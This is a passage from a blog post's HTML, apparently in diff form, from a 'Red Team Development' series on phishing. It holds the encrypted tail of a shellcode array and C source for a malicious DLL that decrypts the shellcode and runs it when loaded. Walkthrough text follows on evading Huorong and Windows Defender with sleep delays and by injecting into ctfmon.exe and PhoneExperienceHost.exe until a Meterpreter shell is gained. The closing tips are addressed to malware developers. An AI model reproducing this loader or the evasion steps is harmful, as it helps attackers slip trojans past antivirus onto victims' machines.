c\xde\x94\x5c\xe1\xb4\x8c\x19\xb9\x9e\xc0\xaa\xbe\x1e\xf3\x5\x17\x89\x95\x93\x97\xf\xde\xc2\x51\xc0\x48\xbd\x67\xa0\x7b\x2\x26\xde\x97\x44\xcc\x9e\x3\xe0\x8a\x57\xd0\x9f\x3\xd0\x88\x28\xcd\x8a\xe\x9f\x5f\x15\x2f\x56\xa0\x6\x22\xcf\x35\x5b\x83\xf1\xae\xd2\xa3\xb8\xbe\x5\xc3\x17\x5e\xc0\xab\xb8\x1e\xbd\xc4\x49\x47\xfe\xa8\xce\x1a\x23\xa8\xa1\xc0\x48\x90\x91\xda\xff\x2\x26\xdf\x1d\x31\x2c\xcb\x4b\x2e\x58\xd6\x18\x51\xdb\xf1\x4b\xde\x80\x19\x82\xa\xc0\x10\x3d\xa6\xad\x5\xae\x81\x66\x1d\xe\x4c\x70\xa9\x1b\x34\x16"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+
+	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> shellcode<span class="token punctuation">[</span><span class="token keyword">sizeof</span> E_shellcode<span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+	<span class="token keyword">char</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"lkdajsdwqe,sadlqwe:_)"</span><span class="token punctuation">;</span>
+	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">sizeof</span> E_shellcode<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		<span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">==</span> <span class="token keyword">sizeof</span> key <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+		shellcode<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>E_shellcode<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x72</span><span class="token punctuation">;</span>
+		j<span class="token operator">++</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+
+	<span class="token keyword">return</span> shellcode<span class="token punctuation">;</span>
+
+<span class="token punctuation">&#125;</span>
+
+
+DWORD WINAPI <span class="token function">jmp_shellcode</span><span class="token punctuation">(</span>LPVOID pPara<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+
+	<span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> addrShellcode <span class="token operator">=</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	DWORD dwOldPro <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+	BOOL ifExec <span class="token operator">=</span> <span class="token function">VirtualProtect</span><span class="token punctuation">(</span>addrShellcode<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>E_shellcode<span class="token punctuation">)</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOldPro<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">EnumUILanguages</span><span class="token punctuation">(</span><span class="token punctuation">(</span>UILANGUAGE_ENUMPROC<span class="token punctuation">)</span>addrShellcode<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+
+HANDLE hThread <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+BOOL WINAPI <span class="token function">DllMain</span><span class="token punctuation">(</span>HMODULE hModule<span class="token punctuation">,</span> DWORD dwReason<span class="token punctuation">,</span> PVOID pvReserved<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span>dwReason <span class="token operator">==</span> DLL_PROCESS_ATTACH<span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token function">DisableThreadLibraryCalls</span><span class="token punctuation">(</span>hModule<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		hThread <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> jmp_shellcode<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token function">MessageBox</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> L<span class="token string">"You are hacked "</span><span class="token punctuation">,</span> L<span class="token string">"Hacked by Leviathan"</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>dwReason <span class="token operator">==</span> DLL_PROCESS_DETACH<span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+	<span class="token punctuation">&#125;</span>
+
+	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Huorong-Bypass"><a href="#Huorong-Bypass" class="headerlink" title="Huorong Bypass"></a>Huorong Bypass</h2><blockquote>
+<p>Diffuculty: 3.0&#x2F;5.0</p>
+</blockquote>
+<p>Bypass Huorong Anti-Virus static detection when the malicious software land on victim machine.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fq-xGGrGe2I4UXLxz4o173jsUCOO.png"></p>
+<p>Execute it and we will get the windows ‘Hacked by Leviathan’<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fl8Gw9TcvDKRg_eoUYMzfl5Zt5VE.png"></p>
+<p>In msf, we get the meterpreter shell after the victim execute the binary file.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpXGiGZtLQjacqWgpDh-oW3bw-51.png"></p>
+<h2 id="Bypass-Windows-Defender"><a href="#Bypass-Windows-Defender" class="headerlink" title="Bypass Windows Defender"></a>Bypass Windows Defender</h2><blockquote>
+<p>Difficulty: 4.5&#x2F;5.0</p>
+</blockquote>
+<p>Also we can bypass Windows Defender static detection<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FiEPmmkcmhKEordBkyMnmTz5Jtdt.png"></p>
+<p>We load the malicious dll in public download directory, it seems well so far.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpPpGkJWwODK2c_e3avrRn5CHT37.png"></p>
+<p>But we can’t get the shell, the windows defender will detect we inject the unknown DLL file in explorer.exe<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Frty5NLFXdW7fuaeyrg2oKvRBgMR.png"></p>
+<p>We get the Windows Defender Threat report.<br>Now we have to try others way to get the shell.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fp3o45AgE_eo2K_63ZDM8WUvFJjN.png"></p>
+<ol>
+<li>We set the Sleep function before the sensitive behaviors like GetProcAddress, CreateRemoteThread and VirutalAllocEx.</li>
+</ol>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FmtmL0PyzSDy1qKsZ7E-Bq8gTxkB.png"></p>
+<ol start="2">
+<li>Sleep more time before write file in public directory. ( Windows Defender will detect it assp :-( )</li>
+</ol>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fih-ebiDCxtfjNeCv8gEXjJ2UcBr.png"></p>
+<p>If we run as an administrator privilege, the Windows Defender will scan it automatically.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FgYu_afzNnMZESCyWEJzPo2CS9Y4.png"></p>
+<ol start="3">
+<li>Try another process we inject in, in this case I try to inject the DLL file in ctfmon.exe process and save the DLL file in administator downloads directory.</li>
+</ol>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Foid3sKWxV71phGmH6taw74Z3gOD.png"></p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FsfSHJenf4dwnPeg0QBkbwUrHtAX.png"></p>
+<p>In this case, injection in PhoneExperienceHost.exe.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtepJCgX7JKmITDA1Ft0qa8NGA8g.png"></p>
+<p>And we get the final shell successfully.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fsmrnpg2QSIyXcgapgJh1H8VNABr.png"></p>
+<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><ol>
+<li>As a malicious software developer, we have to know the trait behaviors in different Anti-Virus softwares. Different Anti-Virus software have their own detect ways. For example, windows defender will pay more attention in sensitive directories (public diectory etc.. ). Huorong is better at static dection in China mainland Anti-Virus softwares.</li>
+<li>DLL injection is relatively easy to realize, but at the same time, it is relatively easy to be detected. So make sure you get the system important information in victim machine ( System verion, Anti-Virus etc…) before you develop the trojan.</li>
+<li>This program still needs to be improved in many aspects, such as communication encryption, more hidden way injection, privilege persistence etc.</li>
+<li>When your file being dectected just trying harder to bypass.</li>
+</ol>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Program-Analysis"><span class="toc-number">1.</span> <span class="toc-text">Program Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Executable-procedure"><span class="toc-number">1.1.</span> <span class="toc-text">Executable procedure</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phishing-part"><span class="toc-number">1.2.</span> <span class="toc-text">Phishing part</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#How-we-store-the-Word-file-in-executable-file"><span class="toc-number">1.2.1.</span> <span class="toc-text">How we store the Word file in executable file?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#How-we-realse-resources"><span class="toc-number">1.2.2.</span> <span class="toc-text">How we realse resources?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#How-we-inject-the-malicious-in-explorer-exe-process"><span class="toc-number">1.2.3.</span> <span class="toc-text">How we inject the malicious in explorer.exe process?</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Escalate-Privilege-part"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">Escalate Privilege part</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Inject-DLL-part"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">Inject DLL part</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-Part"><span class="toc-number">1.3.</span> <span class="toc-text">Bypass Part</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-create-malicious-DLL-file"><span class="toc-number">1.3.1.</span> <span class="toc-text">How to create malicious DLL file?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ShellCode-Encryption"><span class="toc-number">1.3.2.</span> <span class="toc-text">ShellCode Encryption</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Huorong-Bypass"><span class="toc-number">1.4.</span> <span class="toc-text">Huorong Bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-Windows-Defender"><span class="toc-number">1.5.</span> <span class="toc-text">Bypass Windows Defender</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Summary"><span class="toc-number">2.</span> <span class="toc-text">Summary</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/[Red%20Team%20Development]%20Phishing.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/[Red%20Team%20Development]%20Phishing.html&text=Phishing"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/[Red%20Team%20Development]%20Phishing.html&title=Phishing"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/[Red%20Team%20Development]%20Phishing.html&is_video=false&description=Phishing"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Phishing&body=Check out this article: http://kelpie.top/post/[Red%20Team%20Development]%20Phishing.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/[Red%20Team%20Development]%20Phishing.html&title=Phishing"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/[Red%20Team%20Development]%20Phishing.html&title=Phishing"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/[Red%20Team%20Development]%20Phishing.html&title=Phishing"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/[Red%20Team%20Development]%20Phishing.html&title=Phishing"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/[Red%20Team%20Development]%20Phishing.html&name=Phishing&description=&lt;p&gt;*&lt;strong&gt;* Education only **&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Author: Leviathan&lt;br&gt;Date: 11&amp;#x2F;5&amp;#x2F;2022&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Virtual Machine Environment&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Kali Linux IP: 192.168.107.128&lt;br&gt;Windows Defender: 192.168.107.136&lt;br&gt;Windows Huorong: 192.168.107.131&lt;br&gt;Windows Tencent Anti-Virus: 192.168.107.1&lt;/p&gt;
+&lt;/blockquote&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/[Red%20Team%20Development]%20Phishing.html&t=Phishing"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    l3vi4th4n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
